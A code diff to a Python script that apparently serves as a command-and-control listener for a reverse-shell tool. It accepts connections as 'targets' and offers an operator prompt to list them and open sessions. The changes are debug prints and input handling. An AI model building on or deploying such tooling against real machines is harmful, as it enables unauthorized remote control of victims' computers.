@@ -93,6 +93,8 @@ def server():
             target, ip = s.accept()
             targets.append(target)
             ips.append(ip)
+            print("#### TARGET = " + str(targets[0]))
+            print("#### IPS = " + str(ips[0]))
             print(str(targets[client]) + '----' + str(ips[client]) + ' CONNECTED')
             client += 1
         except:
@@ -111,13 +113,23 @@ def main():
     t1 = threading.Thread(target=server)
     t1.start()
     while True:
-        cmd = input('* Center: ')
+        print("Check Point 0")
+        try:
+            cmd = input('* Center: ')
+            print('O CMD 0 e: ' + cmd)
+        except:
+            cmd = ''
+        print('O CMD e: ' + cmd)
+        if cmd == '':
+            continue
         if cmd == 'targets':
             count = 0
+            print("ENTER IN TARGETS")
             for ip in ips:
                 print('Session ' + str(count) + '. <---> ' + str(ip))
                 count += 1
-        elif cmd[:7] == 'session' and len(cmd[8:]) > 1:
+        # elif cmd[:7] == 'session' and len(cmd[8:]) > 1:
+        elif cmd[:7] == 'session':
             try:
                 num = int(cmd[8:])
                 tarnum = targets[num]
